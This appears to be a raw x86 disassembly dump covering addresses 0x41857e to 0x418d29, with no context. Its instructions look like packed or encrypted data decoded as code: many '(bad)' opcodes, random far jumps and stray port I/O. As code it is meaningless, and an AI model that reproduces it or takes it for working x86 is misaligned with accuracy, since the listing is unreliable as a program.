  41857e:	mov    ecx,0x49668328
  418583:	int    0x9d
  418585:	add    al,BYTE PTR [edi]
  418587:	mov    edi,0xdcd1f999
  41858c:	aad    0x3
  41858e:	int    0x4b
  418590:	stc    
  418591:	xchg   ebx,eax
  418592:	jb     0x41855d
  418594:	ja     0x4185dd
  418596:	inc    edi
  418597:	adc    eax,0xc02d2695
  41859c:	repnz loope 0x418528
  41859f:	xchg   ebp,eax
  4185a0:	ja     0x418578
  4185a2:	or     bl,BYTE PTR [edx]
  4185a4:	pop    edi
  4185a5:	aas    
  4185a6:	gs js  0x418578
  4185a9:	not    BYTE PTR [ebx+0x2c]
  4185ac:	or     esp,DWORD PTR [edi]
  4185ae:	mov    edx,0x922e259f
  4185b3:	add    bh,BYTE PTR ds:0x1cc5c23
  4185b9:	fwait
  4185ba:	mov    ds:0x1e7f47b7,eax
  4185bf:	mov    cl,0x9
  4185c1:	or     esp,edx
  4185c3:	dec    edi
  4185c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185c5:	test   edx,0xf9ad509f
  4185cb:	and    ch,BYTE PTR [ecx-0x20]
  4185ce:	nop
  4185cf:	test   eax,0x7dd638d5
  4185d4:	cmp    ah,BYTE PTR [ecx+0x3cec05e7]
  4185da:	mov    ecx,0x8dd92902
  4185df:	(bad)  
  4185e0:	jns    0x418632
  4185e2:	repnz push esp
  4185e4:	into   
  4185e5:	sub    al,0x20
  4185e7:	sbb    DWORD PTR [edi-0x11a81210],ebx
  4185ed:	(bad)  [ecx]
  4185ef:	lock ss cdq 
  4185f2:	ds sub eax,0x5e827c90
  4185f8:	fcomp  st(5)
  4185fa:	xchg   esi,eax
  4185fb:	test   DWORD PTR [ebx-0x4e],ebp
  4185fe:	push   0x11
  418600:	cwde   
  418601:	ja     0x418673
  418603:	rcl    BYTE PTR [edx+0x2c],cl
  418606:	mov    ebp,0x57956021
  41860b:	adc    ecx,ebp
  41860d:	xchg   esi,eax
  41860e:	xchg   edx,eax
  41860f:	add    eax,0xfc5c42c6
  418614:	pop    ebx
  418615:	(bad)  
  418616:	out    0xfa,al
  418618:	mov    dh,0xca
  41861a:	fdiv   QWORD PTR [ebx-0x906e6ec]
  418620:	or     dh,cl
  418622:	pop    edx
  418623:	neg    DWORD PTR [ecx]
  418625:	gs mov edx,0x3dc78df0
  41862b:	idiv   BYTE PTR [eax]
  41862d:	jge    0x418653
  41862f:	pop    edx
  418630:	es push esi
  418632:	and    ah,al
  418634:	mov    ah,BYTE PTR [ebx-0x45]
  418637:	ret    0xee28
  41863a:	std    
  41863b:	mov    cl,0x32
  41863d:	adc    esi,esi
  41863f:	mov    ebx,0xd9054842
  418644:	retf   
  418645:	js     0x41860c
  418647:	inc    ebx
  418648:	lds    esp,FWORD PTR [eax]
  41864a:	or     DWORD PTR [eax-0x39bbe27e],esp
  418650:	jne    0x4186cf
  418652:	or     eax,0x9539a554
  418657:	sbb    cl,dh
  418659:	fisub  WORD PTR ds:0xe02596b5
  41865f:	out    dx,eax
  418660:	pusha  
  418661:	clc    
  418662:	mov    ds:0xc2df0fca,al
  418667:	int3   
  418668:	push   eax
  418669:	pop    edx
  41866a:	pop    esp
  41866b:	xor    al,ch
  41866d:	adc    al,0x22
  41866f:	mov    edx,0x7fd84df0
  418674:	mov    ah,0x3d
  418676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418677:	jl     0x4186b0
  418679:	mov    gs,WORD PTR [ecx+0x48]
  41867c:	ins    DWORD PTR es:[edi],dx
  41867d:	inc    eax
  41867e:	dec    eax
  41867f:	mov    bl,0x61
  418681:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  418683:	mov    ebx,0xc67bfe5e
  418688:	out    0x9f,al
  41868a:	pop    esp
  41868b:	xchg   ebx,eax
  41868c:	sbb    eax,0x94961ac4
  418691:	repz shl BYTE PTR [ebp+eiz*8-0x40ea2449],0x53
  41869a:	sbb    dh,BYTE PTR [ecx-0x7ac23973]
  4186a0:	loop   0x4186ca
  4186a2:	es inc ecx
  4186a4:	cmp    ebp,DWORD PTR [ecx+0x407b0e8c]
  4186aa:	lds    edx,FWORD PTR [esi+0x64]
  4186ad:	std    
  4186ae:	push   edi
  4186af:	int    0x20
  4186b1:	inc    esi
  4186b2:	ret    
  4186b3:	test   eax,0xa5b5d4fc
  4186b8:	call   0x3f0f:0xaf36c4d8
  4186bf:	lods   al,BYTE PTR ds:[esi]
  4186c0:	dec    edi
  4186c1:	jns    0x418714
  4186c3:	mov    ch,0xfa
  4186c5:	and    BYTE PTR [ebx+0xe1c0f36],bl
  4186cb:	cli    
  4186cc:	fst    DWORD PTR [edx]
  4186ce:	xchg   ecx,eax
  4186cf:	ds sub al,0x96
  4186d2:	dec    eax
  4186d3:	pop    esi
  4186d4:	and    WORD PTR [eax-0x6a9f16de],0xffba
  4186dc:	mov    esp,ss
  4186de:	lock mov eax,0x331df20e
  4186e4:	popa   
  4186e5:	fbstp  TBYTE PTR [ebx]
  4186e7:	jae    0x418726
  4186e9:	xchg   ebx,eax
  4186ea:	repnz sbb eax,DWORD PTR cs:[ebx-0x61]
  4186ef:	je     0x41874e
  4186f1:	ss in  al,dx
  4186f3:	ins    BYTE PTR es:[edi],dx
  4186f4:	dec    esi
  4186f5:	pusha  
  4186f6:	or     ecx,esp
  4186f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186f9:	pop    eax
  4186fa:	enter  0xa6d4,0x1f
  4186fe:	cmp    DWORD PTR [ebp+0x553c6404],ebp
  418704:	xchg   ecx,eax
  418705:	and    eax,0x6d563692
  41870a:	inc    eax
  41870b:	push   es
  41870c:	or     BYTE PTR [ebp+eiz*4+0x5],ah
  418710:	pop    ebx
  418711:	adc    BYTE PTR ds:0x707a3ca6,bh
  418717:	mov    bh,0x3a
  418719:	add    ch,BYTE PTR [edi+ebx*1+0x23018bb5]
  418720:	call   0x9a36:0x1b872993
  418727:	mov    ds:0xd23a2d06,al
  41872c:	mov    ?,WORD PTR [edi-0x138b178c]
  418732:	xchg   esp,eax
  418733:	fiadd  WORD PTR [ebp-0x32]
  418736:	popf   
  418737:	arpl   WORD PTR [edi-0x19],ax
  41873a:	rol    ecx,1
  41873c:	push   ecx
  41873d:	add    al,dh
  41873f:	push   ecx
  418740:	test   ebp,esp
  418742:	mul    al
  418744:	sbb    al,0xf6
  418746:	scas   eax,DWORD PTR es:[edi]
  418747:	xlat   BYTE PTR ds:[bx]
  418749:	idiv   ah
  41874b:	test   al,0x1a
  41874d:	inc    edi
  41874e:	push   es
  41874f:	outs   dx,BYTE PTR ds:[esi]
  418750:	add    DWORD PTR [esi],ebp
  418752:	xchg   ecx,eax
  418753:	mov    ah,0x3e
  418755:	sti    
  418756:	mov    ds:0xeb6966b,eax
  41875b:	pop    ebp
  41875c:	leave  
  41875d:	inc    eax
  41875e:	cmp    BYTE PTR [ecx-0x205531d6],0xd5
  418765:	fnstenv [ecx]
  418767:	scas   eax,DWORD PTR es:[edi]
  418768:	iret   
  418769:	cmc    
  41876a:	fisub  DWORD PTR [eax]
  41876c:	jg     0x4186f8
  41876e:	shr    esp,0xfd
  418771:	mov    ch,0x68
  418773:	in     al,0xd6
  418775:	cmp    al,0x5b
  418777:	popa   
  418778:	popf   
  418779:	xchg   ebx,eax
  41877a:	out    0xbf,eax
  41877c:	rcl    bh,0xb8
  41877f:	stos   BYTE PTR es:[edi],al
  418780:	in     eax,0x1d
  418782:	(bad)  
  418783:	call   0xa9689843
  418788:	sub    BYTE PTR [esi-0x50],ah
  41878b:	add    al,0xba
  41878d:	aad    0x1d
  41878f:	(bad)  
  418790:	dec    ebx
  418791:	pop    esi
  418792:	hlt    
  418793:	pmulhw mm2,mm6
  418796:	xlat   BYTE PTR ds:[ebx]
  418797:	fcomip st,st(3)
  418799:	push   es
  41879a:	test   edx,0x82dc1979
  4187a0:	mov    ecx,0xc5c1715c
  4187a5:	rcr    DWORD PTR fs:[esi-0x6d9e0e7],0xf
  4187ad:	mov    DWORD PTR [eax],esi
  4187af:	and    BYTE PTR [edx-0x3f],dl
  4187b2:	xor    al,0x78
  4187b4:	loope  0x418812
  4187b6:	aam    0xfb
  4187b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187b9:	sbb    edx,DWORD PTR [eax+0x3ca7e495]
  4187bf:	rcl    BYTE PTR [ecx-0x3369b677],1
  4187c5:	pop    ecx
  4187c6:	fisub  WORD PTR [edi-0x73]
  4187c9:	sti    
  4187ca:	inc    ebx
  4187cb:	js     0x418806
  4187cd:	or     al,0x7c
  4187cf:	sbb    dh,BYTE PTR [eax+0xe]
  4187d2:	movups XMMWORD PTR [ebx],xmm3
  4187d5:	sub    bh,BYTE PTR [edx-0x6f]
  4187d8:	inc    edx
  4187d9:	cdq    
  4187da:	je     0x418771
  4187dc:	xor    eax,0xe5f879a5
  4187e1:	jne    0x418830
  4187e3:	test   al,0x10
  4187e5:	arpl   WORD PTR [ecx-0x35],si
  4187e8:	push   0x63
  4187ea:	sub    al,0xaa
  4187ec:	cmp    BYTE PTR [edi],dh
  4187ee:	or     esp,0x68103fd
  4187f4:	add    eax,0xc13bca1e
  4187f9:	adc    al,0x5c
  4187fb:	and    DWORD PTR [edx+edi*2-0x61af726e],esi
  418802:	push   esp
  418803:	push   ss
  418804:	jecxz  0x418870
  418806:	xchg   ecx,eax
  418807:	aad    0x5b
  418809:	imul   eax,eax,0xffffff80
  41880c:	enter  0x8f23,0xc0
  418810:	inc    eax
  418811:	pushf  
  418812:	outs   dx,DWORD PTR ds:[esi]
  418813:	jg     0x418837
  418815:	and    ebp,DWORD PTR [edx]
  418817:	xor    al,0xae
  418819:	dec    eax
  41881a:	sub    edi,DWORD PTR [ebx-0xb34542d]
  418820:	xor    DWORD PTR [edx+0x61c70a3c],edi
  418826:	cmp    al,0x90
  418828:	adc    bh,BYTE PTR [ecx-0x3c]
  41882b:	pop    edi
  41882c:	out    0x5,eax
  41882e:	gs pop edx
  418830:	mov    ah,0x9d
  418832:	push   ecx
  418833:	xchg   edx,eax
  418834:	mov    esp,0xcd644ff
  418839:	aam    0x7a
  41883b:	adc    bl,BYTE PTR [ecx+0x1a5b0d4e]
  418841:	lods   al,BYTE PTR ds:[esi]
  418842:	es xor eax,0x3312ec0e
  418848:	jnp    0x41888b
  41884a:	jmp    FWORD PTR [edx-0x27447d4c]
  418850:	jle    0x4188ce
  418852:	xlat   BYTE PTR fs:[ebx]
  418854:	es pop eax
  418856:	mov    cl,0xac
  418858:	or     DWORD PTR [edx-0x8a606d2],eax
  41885e:	out    dx,eax
  41885f:	out    0x2d,eax
  418861:	cdq    
  418862:	dec    edx
  418863:	data16 aam 0x29
  418866:	adc    DWORD PTR [edi],edi
  418868:	data16 aad 0xab
  41886b:	jecxz  0x4187fd
  41886d:	ffree  st(7)
  41886f:	mov    ch,BYTE PTR [eax]
  418871:	sub    DWORD PTR cs:[ecx-0x1231cbc],ecx
  418878:	cld    
  418879:	out    dx,eax
  41887a:	and    edi,DWORD PTR [edi]
  41887c:	xchg   ebp,eax
  41887d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41887e:	cmc    
  41887f:	mov    BYTE PTR [edx-0x70b263e0],bh
  418885:	and    bh,ch
  418887:	cs (bad) 
  41888a:	mov    edx,0x19e6d638
  41888f:	mov    eax,ds:0x13fa2e18
  418894:	stos   BYTE PTR es:[edi],al
  418895:	xchg   ecx,eax
  418896:	jb     0x41886a
  418898:	iret   
  418899:	mov    bl,0xb7
  41889b:	or     DWORD PTR [edi-0x771f22b5],edx
  4188a1:	pop    edx
  4188a2:	xchg   esi,eax
  4188a3:	les    edi,FWORD PTR [esi+edx*8-0x3b007cf8]
  4188aa:	mov    dl,0xba
  4188ac:	push   esi
  4188ad:	rcl    BYTE PTR [ecx],0xb2
  4188b0:	data16 repnz xor dh,BYTE PTR [edx-0x37]
  4188b5:	mov    ecx,0x93db410c
  4188ba:	ins    BYTE PTR es:[edi],dx
  4188bb:	sti    
  4188bc:	sub    eax,0xdc273d3a
  4188c1:	mov    al,ds:0x7674e9fe
  4188c6:	leave  
  4188c7:	adc    BYTE PTR [eax],0x63
  4188ca:	add    DWORD PTR [ebp-0x1f6b5985],edi
  4188d0:	lea    ebp,[edx]
  4188d2:	retf   
  4188d3:	int    0x7c
  4188d5:	add    DWORD PTR [esi-0x38d5e886],0x544a3e1
  4188df:	jne    0x418921
  4188e1:	jle    0x41893f
  4188e3:	mov    cl,0x58
  4188e5:	sub    DWORD PTR [edx-0x24],eax
  4188e8:	out    0xc9,eax
  4188ea:	sub    eax,0x67fb0d28
  4188ef:	mov    cl,0x21
  4188f1:	dec    ebp
  4188f2:	es add BYTE PTR es:[ebx+eiz*8],bl
  4188f7:	or     eax,0xfe8accf0
  4188fc:	adc    DWORD PTR [ebp+0x21c277f2],ebp
  418902:	icebp  
  418903:	xchg   DWORD PTR [ecx],ecx
  418905:	call   0x3865d6fd
  41890a:	jge    0x41892b
  41890c:	stos   DWORD PTR es:[edi],eax
  41890d:	dec    esi
  41890e:	dec    esp
  41890f:	hlt    
  418910:	int    0xf2
  418912:	sub    esi,ecx
  418914:	mov    ah,0x99
  418916:	movd   mm5,DWORD PTR [edi-0x71]
  41891a:	std    
  41891b:	sbb    al,0x5e
  41891d:	movq   QWORD PTR [esi+0x3b],mm0
  418921:	addr16 pop edx
  418923:	jne    0x41892b
  418925:	or     DWORD PTR [ecx-0x4e],esp
  418928:	add    edx,edi
  41892a:	popf   
  41892b:	lea    esi,[edx]
  41892d:	fistp  QWORD PTR [edx-0x2a362306]
  418933:	mov    al,0x3b
  418935:	dec    edi
  418936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418937:	scas   eax,DWORD PTR es:[edi]
  418938:	test   ch,0x59
  41893b:	jbe    0x41899f
  41893d:	inc    edi
  41893e:	je     0x4188d0
  418940:	ds xor eax,0xf2ccb78b
  418946:	jg     0x41891f
  418948:	jns    0x4188de
  41894a:	sub    eax,ebp
  41894c:	rcr    ah,cl
  41894e:	inc    ebx
  41894f:	pop    ebp
  418950:	mov    bh,0x3c
  418952:	cld    
  418953:	cmp    bl,BYTE PTR [ebx]
  418955:	or     eax,DWORD PTR [ebx]
  418957:	in     al,0xc1
  418959:	ret    0xf269
  41895c:	jns    0x418972
  41895e:	mov    esi,0xba1fe44c
  418963:	out    dx,eax
  418964:	sbb    al,0x8a
  418966:	jbe    0x4189ad
  418968:	sar    DWORD PTR [ecx],cl
  41896a:	mov    al,ds:0x22670305
  41896f:	fdiv   st(5),st
  418971:	shl    bl,1
  418973:	dec    esp
  418974:	in     al,0xf7
  418976:	add    ebp,DWORD PTR [edi+0xf9dfa78]
  41897c:	push   cs
  41897d:	inc    ebp
  41897e:	mov    ds:0x3666b9ac,al
  418983:	in     eax,dx
  418984:	jae    0x418935
  418986:	aam    0xbe
  418988:	sahf   
  418989:	xchg   BYTE PTR [edi-0x2],cl
  41898c:	lock leave 
  41898e:	lods   al,BYTE PTR ds:[esi]
  41898f:	retf   
  418990:	inc    edi
  418991:	clc    
  418992:	out    dx,al
  418993:	cmp    edi,DWORD PTR [eax+0x141a30]
  418999:	inc    esp
  41899a:	mov    DWORD PTR [eax+0x4c],edx
  41899d:	mov    BYTE PTR [ebx+edi*8+0x306ae9bb],0xbf
  4189a5:	repz div DWORD PTR [esi+0x6a040685]
  4189ac:	jle    0x418a03
  4189ae:	sahf   
  4189af:	inc    ebx
  4189b0:	into   
  4189b1:	push   ecx
  4189b2:	out    0x95,al
  4189b4:	mov    ds:0x9ed303d6,al
  4189b9:	xchg   edx,eax
  4189ba:	loope  0x41898e
  4189bc:	pop    ebp
  4189bd:	adc    ah,BYTE PTR [esp+ecx*1-0x61]
  4189c1:	mul    DWORD PTR [esp+eax*4]
  4189c4:	shrd   DWORD PTR [ebx],eax,cl
  4189c7:	xor    BYTE PTR [ebp-0x2d],ah
  4189ca:	lock out 0xf3,eax
  4189cd:	inc    ebp
  4189ce:	in     eax,0xc2
  4189d0:	xchg   esp,eax
  4189d1:	mov    edi,DWORD PTR [esi+0x1df03102]
  4189d7:	scas   eax,DWORD PTR es:[edi]
  4189d8:	dec    esi
  4189d9:	push   edi
  4189da:	or     eax,0x975ab2e9
  4189df:	xchg   esi,esp
  4189e1:	mov    bl,0x92
  4189e3:	or     DWORD PTR [ebp-0x74],edx
  4189e6:	les    esi,FWORD PTR [esi]
  4189e8:	mov    ecx,0x70b3a5af
  4189ed:	sub    BYTE PTR [edx-0x24b8cea4],al
  4189f3:	mov    ebp,0xb4987960
  4189f8:	or     al,0x5b
  4189fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189fb:	(bad)  
  4189fc:	push   cs
  4189fd:	xchg   bp,ax
  4189ff:	xchg   ebx,eax
  418a00:	sub    al,0x29
  418a02:	aam    0x70
  418a04:	jg     0x418a41
  418a06:	and    BYTE PTR [ebx],al
  418a08:	dec    eax
  418a09:	fidivr DWORD PTR [edx+0x4]
  418a0c:	inc    esi
  418a0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a0e:	pop    edx
  418a0f:	stos   BYTE PTR es:[edi],al
  418a10:	shr    DWORD PTR [edx-0x45501bad],1
  418a16:	(bad)  
  418a17:	jns    0x418a3b
  418a19:	sbb    DWORD PTR [edx+0x2d515f25],eax
  418a1f:	fdiv   DWORD PTR [ebx]
  418a21:	xor    DWORD PTR [eax-0x54],esp
  418a24:	sbb    ch,al
  418a26:	movntps XMMWORD PTR [ecx],xmm1
  418a29:	push   ebp
  418a2a:	pushf  
  418a2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a2c:	xor    eax,0x7f8a2589
  418a31:	mov    ds:0x884b6402,al
  418a36:	rcr    BYTE PTR [ecx+0x61b78e3d],0x94
  418a3d:	shl    BYTE PTR [ecx],cl
  418a3f:	icebp  
  418a40:	sbb    edi,DWORD PTR [ecx]
  418a42:	mov    ch,0xc6
  418a44:	ret    
  418a45:	pusha  
  418a46:	loop   0x418a45
  418a48:	xor    eax,0xa7befb6a
  418a4d:	sbb    esp,edx
  418a4f:	in     al,0x92
  418a51:	test   al,0xbc
  418a53:	jb     0x418a0a
  418a55:	jo     0x418a83
  418a57:	(bad)  
  418a58:	xchg   edi,eax
  418a59:	mov    dl,0x4
  418a5b:	pop    edx
  418a5c:	out    dx,al
  418a5d:	cmp    eax,0x987403f6
  418a62:	mov    esi,0x52123cec
  418a67:	das    
  418a68:	int    0x84
  418a6a:	push   ds
  418a6b:	mov    al,ds:0x47abef97
  418a70:	jecxz  0x418a6c
  418a72:	pop    ecx
  418a73:	stc    
  418a74:	call   0xb11ab0f4
  418a79:	mov    ch,0x25
  418a7b:	jns    0x418a13
  418a7d:	xor    BYTE PTR [ecx-0x7d],0xfe
  418a81:	cmp    eax,0x1d361146
  418a86:	or     al,0x21
  418a88:	aas    
  418a89:	test   DWORD PTR [esi-0x51],ebp
  418a8c:	dec    edi
  418a8d:	std    
  418a8e:	pop    ecx
  418a8f:	stc    
  418a90:	cld    
  418a91:	jmp    0x7598:0x1e8dccb0
  418a98:	ins    BYTE PTR es:[edi],dx
  418a99:	cs test edx,edi
  418a9c:	sbb    DWORD PTR [edi+0x13],ebx
  418a9f:	adc    DWORD PTR [edx],edi
  418aa1:	cli    
  418aa2:	(bad)  
  418aa4:	cmp    eax,0x2e000c03
  418aa9:	inc    ecx
  418aaa:	arpl   cx,bx
  418aac:	xor    edi,ebx
  418aae:	xchg   ecx,eax
  418aaf:	clc    
  418ab0:	cmp    bl,bh
  418ab2:	adc    esp,DWORD PTR [ebx+0x26ed5f3e]
  418ab8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ab9:	add    al,0x81
  418abb:	add    dl,BYTE PTR [edx]
  418abd:	inc    ebp
  418abe:	xchg   esi,eax
  418abf:	fcomp  DWORD PTR [edx-0x79]
  418ac2:	cmp    DWORD PTR [edi+0x30dd4f13],ecx
  418ac8:	push   edx
  418ac9:	lods   al,BYTE PTR ds:[esi]
  418aca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418acb:	leave  
  418acc:	mov    fs,WORD PTR [ebx]
  418ace:	inc    edx
  418acf:	xlat   BYTE PTR ds:[ebx]
  418ad0:	xor    al,0x85
  418ad2:	pop    esp
  418ad3:	jnp    0x418b32
  418ad5:	fistp  DWORD PTR [edi-0x1d097d36]
  418adb:	pop    ds
  418adc:	retf   0x8dbe
  418adf:	js     0x418ae9
  418ae1:	sbb    BYTE PTR [ecx+0x831e71d],al
  418ae7:	push   edx
  418ae8:	(bad)  
  418ae9:	lods   eax,DWORD PTR ds:[esi]
  418aea:	and    esi,ebp
  418aec:	je     0x418b3b
  418aee:	or     DWORD PTR [ebx+0x5f083f75],eax
  418af4:	push   ss
  418af5:	push   eax
  418af6:	int3   
  418af7:	mov    ebp,0xeb7e5786
  418afc:	test   DWORD PTR [esi+ebx*8],0xd44f095d
  418b03:	cmp    al,0x11
  418b05:	jmp    0x8dfd7d37
  418b0a:	ins    DWORD PTR es:[edi],dx
  418b0b:	std    
  418b0c:	sub    cl,BYTE PTR [edx+0x79]
  418b0f:	ins    DWORD PTR es:[edi],dx
  418b10:	dec    edx
  418b11:	mov    ebp,0x1b73c8fb
  418b16:	fwait
  418b17:	mov    edi,0xa95e26aa
  418b1c:	pop    edi
  418b1d:	push   ds
  418b1e:	les    ebx,FWORD PTR [ecx]
  418b20:	xchg   ebx,eax
  418b21:	int3   
  418b22:	stc    
  418b23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b24:	leave  
  418b25:	mov    edx,0x9f99332e
  418b2a:	in     al,dx
  418b2b:	scas   al,BYTE PTR es:[edi]
  418b2c:	jecxz  0x418b36
  418b2e:	aas    
  418b2f:	sub    edi,DWORD PTR [edx+esi*1+0x0]
  418b33:	test   DWORD PTR [ebx+0x5ffeb3f9],ecx
  418b39:	imul   ebp,DWORD PTR [esi+0x22],0xffffffbd
  418b3d:	push   edi
  418b3e:	mov    BYTE PTR [edx+eax*2],cl
  418b41:	ror    DWORD PTR [ecx-0x2a],cl
  418b44:	int    0xb5
  418b46:	xor    al,0x2a
  418b48:	ret    0xa1ec
  418b4b:	stos   BYTE PTR es:[edi],al
  418b4c:	nop
  418b4d:	sub    BYTE PTR [esi+0x5f],0xa3
  418b51:	inc    esi
  418b52:	xchg   esp,eax
  418b53:	mov    edx,0x656e63a9
  418b58:	popa   
  418b59:	cmp    DWORD PTR [eax],edi
  418b5b:	mov    bl,0xd3
  418b5d:	push   0x408233ed
  418b62:	pop    ss
  418b63:	test   eax,0x8a293a07
  418b68:	(bad)  
  418b69:	fistp  WORD PTR [edx]
  418b6b:	call   0x54e7:0xa9106bc5
  418b72:	and    DWORD PTR [eax+0x7924c77c],0xffffff98
  418b79:	or     DWORD PTR [ebx-0x258bc417],ebx
  418b7f:	stos   DWORD PTR es:[edi],eax
  418b80:	pop    edi
  418b81:	fs (bad) 
  418b84:	outs   dx,DWORD PTR ds:[esi]
  418b85:	inc    bx
  418b87:	stos   DWORD PTR es:[edi],eax
  418b88:	pop    ss
  418b89:	pop    edi
  418b8a:	jns    0x418be9
  418b8c:	or     eax,0xb2125393
  418b91:	test   BYTE PTR [ebp-0x1],ch
  418b94:	xchg   edx,eax
  418b95:	push   esi
  418b96:	(bad)  
  418b97:	xchg   edx,eax
  418b98:	sbb    esp,esp
  418b9a:	mov    edi,0x5ec213ec
  418b9f:	iret   
  418ba0:	inc    esp
  418ba1:	mov    BYTE PTR [edx+0x73],bh
  418ba4:	pop    ebp
  418ba5:	fdivr  DWORD PTR [ecx]
  418ba7:	in     eax,0x3
  418ba9:	mov    ecx,DWORD PTR [ecx]
  418bab:	jmp    0xe6df365a
  418bb0:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  418bb2:	(bad)  
  418bb3:	push   esp
  418bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bb5:	in     al,dx
  418bb6:	sbb    cl,BYTE PTR [edi]
  418bb8:	int    0x5f
  418bba:	adc    DWORD PTR [eax],eax
  418bbc:	add    ebp,ebx
  418bbe:	rol    DWORD PTR [ebp+0x3b],cl
  418bc1:	cmp    edi,edx
  418bc3:	cmc    
  418bc4:	popf   
  418bc5:	jnp    0x418b5c
  418bc7:	lds    edi,FWORD PTR [ebx]
  418bc9:	js     0x418bf7
  418bcb:	mov    dl,0xac
  418bcd:	and    BYTE PTR ds:0xf41f,bl
  418bd2:	xor    al,0xa9
  418bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bd5:	xchg   ebp,eax
  418bd6:	mov    eax,0x7169ffe9
  418bdb:	cmp    ebp,0x71b5b322
  418be1:	pop    ebx
  418be2:	fiadd  DWORD PTR [edi-0x17c81dd]
  418be8:	adc    BYTE PTR [ebx+esi*1],dh
  418beb:	xchg   ebx,eax
  418bec:	mov    ah,0xec
  418bee:	test   al,0xcf
  418bf0:	(bad)  
  418bf1:	imul   BYTE PTR ds:0x2b033a56
  418bf7:	not    BYTE PTR [edx+edx*1+0x12]
  418bfb:	pop    ds
  418bfc:	or     BYTE PTR [edi],cl
  418bfe:	stos   DWORD PTR es:[edi],eax
  418bff:	loop   0x418c1f
  418c01:	inc    edi
  418c02:	into   
  418c03:	test   eax,0x76c9fbb4
  418c08:	mov    ch,0x70
  418c0a:	mov    WORD PTR [eax+0x1b1d5ea3],cs
  418c10:	std    
  418c11:	sbb    eax,0x6955d80c
  418c16:	pop    esi
  418c17:	xchg   bh,dl
  418c19:	add    eax,0x2cffe334
  418c1e:	es jns 0x418ba4
  418c21:	addr16 in eax,0xd2
  418c24:	ins    BYTE PTR es:[edi],dx
  418c25:	dec    edx
  418c26:	inc    edi
  418c27:	jb     0x418c5b
  418c29:	xor    al,0x71
  418c2b:	add    BYTE PTR [ecx-0x2fd9eaaa],0xc7
  418c32:	cmp    cl,dh
  418c34:	xchg   BYTE PTR [esi+0x7b],ah
  418c37:	jl     0x418c33
  418c39:	sbb    BYTE PTR gs:[edi],ah
  418c3c:	lea    ecx,[esi-0x2a023882]
  418c42:	push   ss
  418c43:	sti    
  418c44:	ja     0x418c85
  418c46:	xchg   ebp,eax
  418c47:	ret    
  418c48:	sub    esi,DWORD PTR [esi+0x27]
  418c4b:	inc    ebx
  418c4c:	(bad)  
  418c4d:	sahf   
  418c4e:	jle    0x418c5f
  418c50:	and    al,0x12
  418c52:	imul   eax,DWORD PTR [edi],0x13198f61
  418c58:	cmp    al,0x4f
  418c5a:	and    edx,DWORD PTR [eax]
  418c5c:	jmp    0x443e:0xfd870bd
  418c63:	scas   eax,DWORD PTR es:[edi]
  418c64:	(bad)  
  418c65:	rcr    BYTE PTR [ebx],1
  418c67:	jmp    0xec2789b6
  418c6c:	mov    esp,0xd471cb75
  418c71:	mov    eax,0x605ad4e8
  418c76:	lods   eax,DWORD PTR ds:[esi]
  418c77:	mov    edi,gs
  418c79:	repnz into 
  418c7b:	pop    es
  418c7c:	mov    ah,0xb2
  418c7e:	sub    bl,BYTE PTR [ecx]
  418c80:	out    0x31,al
  418c82:	popw   ds
  418c84:	push   es
  418c85:	mov    esp,edx
  418c87:	in     al,dx
  418c88:	out    dx,al
  418c89:	ss sub ebp,0xffffffc5
  418c8d:	sub    DWORD PTR [esi],ecx
  418c8f:	mov    ecx,0xd20b12d0
  418c94:	xchg   edx,eax
  418c95:	pop    edx
  418c96:	std    
  418c97:	add    DWORD PTR [esi+ebx*1],edi
  418c9a:	outs   dx,BYTE PTR ds:[esi]
  418c9b:	or     al,0xfc
  418c9d:	pop    es
  418c9e:	jae    0x418cf8
  418ca0:	and    DWORD PTR [ebx],eax
  418ca2:	sbb    BYTE PTR ds:0x8aacbfbf,bh
  418ca8:	out    0x99,al
  418caa:	in     eax,dx
  418cab:	add    DWORD PTR [eax],esi
  418cad:	sahf   
  418cae:	ds sbb al,0x92
  418cb1:	es repz jl 0x418cd1
  418cb5:	xchg   ebx,eax
  418cb6:	push   edx
  418cb7:	xchg   esi,eax
  418cb8:	cs int3 
  418cba:	fwait
  418cbb:	jmp    0xf99c:0xf2b91c4c
  418cc2:	pusha  
  418cc3:	mov    bh,0xfc
  418cc5:	or     DWORD PTR [ecx+edx*2+0x3b850178],edi
  418ccc:	xchg   esi,eax
  418ccd:	(bad)  
  418cce:	sbb    al,0xbc
  418cd0:	jno    0x418cd0
  418cd2:	sub    DWORD PTR [edx],esp
  418cd4:	mov    eax,ds:0xb559d89d
  418cd9:	aam    0xcf
  418cdb:	pop    ebx
  418cdc:	inc    ebx
  418cdd:	pop    es
  418cde:	sbb    esp,DWORD PTR [eax+0x2f]
  418ce1:	inc    edx
  418ce2:	sbb    BYTE PTR [edx],al
  418ce4:	cli    
  418ce5:	loope  0x418d41
  418ce7:	rcr    edi,0x4b
  418cea:	daa    
  418ceb:	(bad)  
  418cec:	paddusb mm5,mm6
  418cef:	cmc    
  418cf0:	mov    ds:0xe68c385d,al
  418cf5:	cs rcl esp,cl
  418cf8:	xor    DWORD PTR [esi+0x674b778c],ebp
  418cfe:	mov    cl,0xf3
  418d00:	pop    ebp
  418d01:	mov    ds:0x59e062fa,eax
  418d06:	scas   al,BYTE PTR es:[edi]
  418d07:	(bad)  
  418d08:	pop    edi
  418d09:	dec    ebp
  418d0a:	jmp    0xf51f:0x5e76f85b
  418d11:	and    eax,0xc22fc5d3
  418d16:	cwde   
  418d17:	call   0xec332754
  418d1c:	sahf   
  418d1d:	mov    edx,0x375f8519
  418d22:	sbb    DWORD PTR [ebx],0xe4f95a27
  418d28:	clc    
  418d29:	iret   
